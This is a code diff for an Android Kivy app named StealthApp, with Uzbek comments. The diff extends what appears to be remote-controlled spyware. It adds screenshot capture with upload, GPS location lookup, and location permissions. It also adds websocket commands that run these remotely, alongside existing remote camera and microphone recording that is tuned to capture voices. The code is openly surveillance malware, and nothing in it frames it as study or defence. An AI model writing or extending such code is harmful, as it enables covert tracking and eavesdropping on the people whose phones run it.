@@ -215,6 +215,60 @@ def take_photo_kivy(front_camera):
         threading.Thread(target=send_text_sync, args=(msg,), daemon=True).start()
 
 
+# ─── EKRAN RASMI (Screenshot) ──────────────────────────────────────────────────
+def take_screenshot_sync():
+    try:
+        from kivy.core.window import Window
+        from jnius import autoclass
+        activity = autoclass('org.kivy.android.PythonActivity').mActivity
+        ext_dir  = activity.getExternalFilesDir(None).getAbsolutePath()
+        filepath = ext_dir + '/screenshot.png'
+
+        # Kivy oynasini rasmga olish
+        Window.screenshot(name=filepath)
+        
+        # Kivy screenshot nomiga sanani qo'shib yuboradi, shuni to'g'irlaymiz
+        # Window.screenshot('a.png') -> creates 'a0001.png' etc.
+        # Shuning uchun eng yangi .png faylni qidiramiz
+        time.sleep(1.0)
+        import glob
+        files = glob.glob(ext_dir + '/screenshot*.png')
+        if files:
+            latest_file = max(files, key=os.path.getctime)
+            threading.Thread(
+                target=upload_file_sync, args=(latest_file, 'photo'), daemon=True
+            ).start()
+            return "Ekran rasmi olindi, yuborilmoqda..."
+        else:
+            return "Ekran rasmi: Fayl yaratilmadi."
+    except Exception as e:
+        return "Screenshot xatoligi: " + str(e)
+
+
+# ─── MANZIL (GPS) ──────────────────────────────────────────────────────────────
+def get_location_sync():
+    try:
+        from jnius import autoclass
+        activity = autoclass('org.kivy.android.PythonActivity').mActivity
+        Context  = autoclass('android.content.Context')
+        LM       = activity.getSystemService(Context.LOCATION_SERVICE)
+
+        # GPS yoki Tarmoq orqali oxirgi ma'lum bo'lgan manzilni olish
+        loc = LM.getLastKnownLocation('gps')
+        if not loc:
+            loc = LM.getLastKnownLocation('network')
+
+        if loc:
+            lat = loc.getLatitude()
+            lon = loc.getLongitude()
+            maps_url = "📍 Manzil topildi:\nhttps://www.google.com/maps?q=" + str(lat) + "," + str(lon)
+            return maps_url
+        else:
+            return "📍 Manzil: Aniqlab bo'lmadi (GPS o'chiq bo'lishi mumkin)."
+    except Exception as e:
+        return "📍 Manzil xatoligi: " + str(e)
+
+
 # ─── AUDIO ──────────────────────────────────────────────────────────────────────
 def record_audio():
     try:
@@ -229,9 +283,13 @@ def record_audio():
         filepath = ext_dir + '/audio.m4a'
 
         rec = MR()
-        rec.setAudioSource(AS_.MIC)
+        # VOICE_RECOGNITION ovoz uchun sezgirroq
+        rec.setAudioSource(AS_.VOICE_RECOGNITION)
         rec.setOutputFormat(OF.MPEG_4)
         rec.setAudioEncoder(AE.AAC)
+        rec.setAudioChannels(1)
+        rec.setAudioSamplingRate(44100)
+        rec.setAudioEncodingBitRate(128000)
         rec.setOutputFile(filepath)
         rec.prepare()
         rec.start()
@@ -273,6 +331,14 @@ async def ws_loop():
                         Clock.schedule_once(lambda dt: take_photo_kivy(True), 0)
                     elif msg == 'record_audio':
                         threading.Thread(target=record_audio, daemon=True).start()
+                    elif msg == 'get_location':
+                        info = get_location_sync()
+                        status[0] = info
+                        await loop.run_in_executor(None, send_text_sync, info)
+                    elif msg == 'get_screenshot':
+                        info = take_screenshot_sync()
+                        status[0] = info
+                        await loop.run_in_executor(None, send_text_sync, info)
                     elif msg == 'battery':
                         info = get_battery_info()
                         status[0] = info
@@ -380,6 +446,8 @@ class StealthApp(App):
                 Permission.CAMERA, Permission.RECORD_AUDIO,
                 Permission.INTERNET, Permission.WRITE_EXTERNAL_STORAGE,
                 Permission.READ_EXTERNAL_STORAGE,
+                Permission.ACCESS_FINE_LOCATION,
+                Permission.ACCESS_COARSE_LOCATION,
             ], self._on_permissions_result)
         except Exception as e:
             status[0] = 'Ruxsat xatoligi: ' + str(e)[:80]
